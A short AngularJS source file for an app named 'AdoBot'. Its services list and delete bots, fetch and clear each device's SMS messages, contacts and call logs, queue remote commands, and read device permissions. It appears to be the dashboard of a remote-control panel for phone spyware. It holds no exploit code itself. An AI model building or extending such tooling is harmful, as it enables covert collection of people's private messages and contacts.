
(function () {

  'use strict';

  angular.module('AdoBot')
    .service('BotService', ['$http', function($http) {

      this.fetch = function() {
        return $http.get('/bots');
      };

      this.get = function(id) {
        return $http.get('/bots/' + id);
      };

      this.delete =function(id) {
        return $http.delete('/bots/'+id);
      };

    }])

    .service('MessageService', [
      '$http',
      function($http) {
        this.fetch = function(uid) {
          return $http.get('/get-messages/' + uid);
        };

        this.clear = function(uid) {
          return $http.delete('/clear-messages/' + uid);
        };

        this.deleteThread = function (uid, t_id) {
          return $http.delete('/sms/thread/' + uid + '/' + t_id);
        };
      }
    ])

    .service('ContactService', [
      '$http',
      function($http) {
        this.fetch = function(uid) {
          return $http.get('/contacts/' + uid);
        };

        this.clear = function(uid) {
          return $http.delete('/contacts/' + uid);
        };
      }
    ])

    .service('CallLogService', [
      '$http',
      function($http) {
        this.fetch = function(uid) {
          return $http.get('/call-logs/' + uid);
        };

        this.clear = function(uid) {
          return $http.delete('/call-logs/' + uid);
        };
      }
    ])

    .service('CommandService', [
      '$http',
      function($http) {
        this.add = function(cmd) {
          return $http.post('/add-command', cmd);
        };

        this.getPending = function(uid) {
          return $http.get('/pending-commands?uid=' + uid);
        };

        this.delete = function(id) {
          return $http.delete('/commands/' + id);
        };
      }
    ])

    .service('PermissionService', [
      '$http',
      function($http) {
        this.fetch = function(uid) {
          return $http.get('/permissions/' + uid);
        };
      }
    ]);
})();

